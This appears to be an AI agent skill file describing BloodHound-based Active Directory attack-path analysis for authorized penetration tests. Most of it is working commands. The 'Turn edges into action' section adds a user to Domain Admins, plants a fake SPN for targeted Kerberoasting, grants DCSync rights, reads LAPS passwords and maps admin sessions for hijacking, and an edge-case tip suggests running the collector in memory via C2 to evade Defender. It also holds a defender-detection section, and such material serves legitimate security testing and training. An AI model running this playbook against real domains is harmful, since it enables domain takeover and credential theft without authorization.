---
name: bloodhound-methodology
description: Use when mapping Active Directory attack paths on an authorized
  engagement. Covers choosing and running the BloodHound 4.5.x collector
  (SharpHound 2.x on Windows, bloodhound-ce-python on Linux), importing data,
  marking principals as owned, and analyzing paths with prebuilt queries and
  raw Cypher: shortest paths to Domain Admins, Kerberoastable and AS-REP
  roastable users, delegation abuse, and session based lateral movement. Use
  when you hold any domain credentials and need to turn enumeration into a
  prioritized plan, or when an assessment calls for full attack path
  analysis.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [ad-enumeration, password-attacks]
tools:
  - name: BloodHound
    version: 4.5.x
  - name: SharpHound
    version: 2.x
  - name: NetExec
    version: 1.4.0
  - name: impacket
    version: 0.12.0
  - name: Python
    version: 3.12
---

BloodHound turns raw Active Directory enumeration into a graph of who can
reach what. The collector gathers users, computers, groups, sessions,
ACLs, and trusts, and the interface answers the question that matters:
what is the shortest path from the access I have to the access I want.
This skill covers the full authorized workflow for Active Directory
assessments, lab environments, and CTFs only: collecting safely,
importing and verifying the data, analyzing with prebuilt and custom
queries, and converting graph edges into concrete next steps.

## Quick Workflow

1. Confirm you hold valid domain credentials and note the domain name,
   domain controller IP, and a DNS server that resolves the domain.
2. Pick the collector: SharpHound on a Windows host inside the network,
   bloodhound-ce-python from a Linux attack box.
3. Run collection with the default All set first, then add targeted
   collectors if something was missed.
4. Import the output into BloodHound and verify node counts against a
   quick LDAP user count.
5. Mark every compromised principal as Owned, starting with your initial
   credential.
6. Run the prebuilt query for shortest paths from owned principals to
   Domain Admins.
7. Work the path edge by edge, using the tool each edge type calls for.
8. Re-collect after each privilege gain, because new rights reveal new
   edges.

## 1. Choose and run the collector

SharpHound on a domain joined or network adjacent Windows host gives the
richest collection, including local sessions. The Linux collector works
from any attack box with credentials.

```powershell
# SharpHound on Windows: full collection into C:\temp
SharpHound.exe -c All --Domain corp.local --DomainController 10.10.10.10 --OutputDirectory C:\temp
```

```bash
# bloodhound-ce-python on Linux: full collection
bloodhound-ce-python -u svcuser -p 'Password1' -d corp.local \
  -dc 10.10.10.10 -ns 10.10.10.10 -c all --zip
```

Useful collector subsets when the full run is too noisy or too slow:

```powershell
# Lighter run: skip session collection on large domains
SharpHound.exe -c Group,LocalGroup,ACL,ObjectProps,Container,Trusts --Domain corp.local --OutputDirectory C:\temp
```

```bash
# Linux: ACLs and object properties only, for a quick privilege map
bloodhound-ce-python -u svcuser -p 'Password1' -d corp.local \
  -dc 10.10.10.10 -ns 10.10.10.10 -c acl,objectprops --zip
```

Copy the resulting zip or JSON files back to the machine running
BloodHound, then drag them into the upload area or use the import button.

## 2. Verify the import

A bad import looks like success but shows an empty graph. Sanity check
before you analyze.

```bash
# Quick LDAP user count to compare against BloodHound's user node count
ldapsearch -x -H ldap://10.10.10.10 -D 'svcuser@corp.local' -w 'Password1' \
  -b 'DC=corp,DC=local' '(objectClass=user)' dn | grep -c '^dn:'
```

In the BloodHound interface, the node counts appear on the database info
panel. If users or computers are far below the LDAP count, re-run the
collector with explicit `-dc` and `-ns` values, since name resolution is
the most common cause of partial collection. Trusts only appear with the
Trusts collector, and sessions need the Session collector plus readable
remote registry or NetSessionEnum rights.

## 3. Mark owned principals and find the path

BloodHound plans from what you own. Mark the initial credential first,
then every new principal as you compromise it.

```bash
# Mark a user as owned through the Neo4j HTTP API (BloodHound 4.x backend)
curl -s -u neo4j:'BloodHoundPass1' -H 'Content-Type: application/json' \
  -d '{"statements":[{"statement":"MATCH (u:User {name: $name}) SET u.owned=TRUE RETURN u.name","parameters":{"name":"SVCUSER@CORP.LOCAL"}}]}' \
  http://127.0.0.1:7474/db/neo4j/tx/commit
```

In the GUI the same action is right click, Mark User as Owned. Then run
the prebuilt query: Shortest Paths from Owned Principals to Domain Admins.
This single query usually produces the whole engagement plan.

## 4. Analyze with prebuilt queries and raw Cypher

Prebuilt queries cover the common cases. Open Analysis, Queries, Pre-Built
Analytics and work through the ones that match your foothold: kerberoastable
users, AS-REP roastable users, shortest path to high value targets,
unconstrained delegation systems, computers with unconstrained delegation,
and domain trusts.

Raw Cypher handles everything else. These run in the query bar:

```cypher
// Shortest path from anything owned to Domain Admins
MATCH (n {owned:TRUE}), (m:Group), p=shortestPath((n)-[*1..]->(m))
WHERE m.name =~ 'DOMAIN ADMINS@.*'
RETURN p
```

```cypher
// Kerberoastable users (have an SPN)
MATCH (u:User) WHERE u.hasspn=TRUE
RETURN u.name ORDER BY u.name
```

```cypher
// AS-REP roastable users (preauth disabled)
MATCH (u:User) WHERE u.dontreqpreauth=TRUE
RETURN u.name ORDER BY u.name
```

```cypher
// Computers with unconstrained delegation (prime coercion targets)
MATCH (c:Computer) WHERE c.unconstraineddelegation=TRUE
RETURN c.name ORDER BY c.name
```

```cypher
// Users with an active session on a server you care about
MATCH (u:User)-[:HasSession]->(c:Computer)
WHERE c.name =~ '.*SQL.*'
RETURN u.name, c.name
```

```cypher
// Who can DCSync the domain (replication rights on the domain object)
MATCH (n)-[:GetChanges|GetChangesAll]->(d:Domain)
RETURN n.name, d.name
```

Read the edge labels on any path: MemberOf, AdminTo, HasSession,
GenericAll, GenericWrite, WriteOwner, WriteDACL, ForceChangePassword,
AddMember, AllowedToDelegate, CanRDP, CanPSRemote, Owns, ReadLAPSPassword,
and DCSync. The edge name tells you exactly which abuse to attempt next.

## 5. Turn edges into action

Each edge maps to a concrete tool. Work the shortest path one edge at a
time and re-mark ownership after each success.

```bash
# ForceChangePassword edge: reset the target password over RPC (PowerView)
# Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force) -Verbose
```

```bash
# AddMember edge: add your user to the privileged group
net rpc group addmem "Domain Admins" eviluser \
  -U 'corp.local/admin%Password1' -S 10.10.10.10
```

```bash
# GenericWrite on a user: targeted Kerberoasting, add a fake SPN then roast it
ldapmodify -x -H ldap://10.10.10.10 -D 'eviluser@corp.local' -w 'Password1' <<'EOF'
dn: CN=victim,CN=Users,DC=corp,DC=local
changetype: modify
add: servicePrincipalName
servicePrincipalName: fake/svc
EOF
GetUserSPNs.py -dc-ip 10.10.10.10 corp.local/eviluser:Password1 -request
```

```bash
# WriteDACL edge granting replication rights: give yourself DCSync with dacledit
dacledit.py -action write -rights DCSync -principal eviluser \
  -target-dn "DC=corp,DC=local" "corp.local/admin:Password1@10.10.10.10"
```

```bash
# HasSession edge: where admins are logged on, for token or session hijack planning
nxc smb 10.10.10.10 -u eviluser -p 'Password1' --loggedon-users
```

```bash
# ReadLAPSPassword edge: pull the local admin password
nxc ldap 10.10.10.10 -u eviluser -p 'Password1' -M laps
```

Keep a lab notebook of which edges you tried and their results. BloodHound
shows possible paths, not guaranteed ones, and stale session data is the
most common reason a promising path fails.

## Edge cases

- SharpHound gets flagged by Defender the moment it touches disk. Run it
  in memory through your C2, use the Linux collector instead, or fall
  back to targeted collectors that avoid the most signatured behavior.
- bloodhound-ce-python fails with DNS errors when the attack box cannot
  resolve the domain. Pass `-ns` with the DC IP and add the domain to
  /etc/hosts.
- Session collection returns nothing. It needs remote registry access or
  NetSessionEnum rights on each host, which low privilege users rarely
  have. Plan paths that do not depend on sessions first.
- The graph shows users as owned that you marked in a previous import.
  Owned flags persist in the database, so clear stale ownership before
  each fresh engagement with `MATCH (n {owned:TRUE}) SET n.owned=FALSE`.
- Neo4j runs out of heap on large domains. Raise the heap in the Neo4j
  config and restart the database before importing multi hundred thousand
  node datasets.
- Import succeeds but queries return nothing. Check that the zip actually
  contained JSON files and that the BloodHound version matches the
  collector output format (4.x collectors with 4.x BloodHound).
- Clock skew between the attack box and the DC breaks Kerberos based
  collection. Sync time with ntpdate against the DC before collecting.
- Multi domain forests need one collection per domain plus the Trusts
  collector. Collect the trusting and trusted domains separately, then
  analyze cross domain paths in the combined graph.

## Escalation

- No path to Domain Admins from owned principals: widen the target to
  high value groups (Backup Operators, Account Operators, Exchange
  admins) whose members have indirect paths upward.
- Prebuilt queries are empty: write raw Cypher against specific edges,
  for example all GenericWrite edges held by owned users regardless of
  target.
- ACL edges look promising but exploitation fails: confirm with the
  daclread module or PowerView Get-ObjectAcl, because BloodHound ACL data
  can be stale after recent permission changes.
- Collection keeps getting blocked: enumerate manually with ldapsearch
  and the ad-enumeration skill for the specific objects on your path,
  then continue without the full graph.
- The domain is huge and full collection times out: collect per OU with
  targeted base DNs, or use DCOnly style runs and add sessions later from
  a host with better network position.
- You suspect the graph is stale mid engagement: re-collect only the
  collectors that changed (usually ACL and Group) instead of the full set.

## Detection and defender view

Defenders see BloodHound collection as a burst of LDAP queries from one
source reading large parts of the directory, logged as Event ID 4662
(directory service access) on the DC, plus SMB connections to many hosts
during session enumeration. SharpHound has well known signatures and
Defender raises alerts on its execution, in memory or on disk. The durable
defenses are structural: remove the misconfigurations the graph
highlights, especially excessive ACLs, unconstrained delegation, and
flat admin tiers. Tiered administration and Protected Users for
privileged accounts shrink the graph dramatically. Monitoring for mass
4662 reads and SharpHound process behavior catches the collection itself.

## Key references

- MITRE ATT&CK T1087 (Account Discovery): user and group enumeration.
- MITRE ATT&CK T1018 (Remote System Discovery): computer enumeration.
- MITRE ATT&CK T1069 (Permission Groups Discovery): group membership
  mapping.
- MITRE ATT&CK T1482 (Domain Trust Discovery): trust collection.
- BloodHound documentation:
  https://bloodhound.readthedocs.io
- SharpHound collector:
  https://github.com/BloodHoundAD/SharpHound
- bloodhound-ce-python collector:
  https://github.com/dirkjanm/BloodHound.py
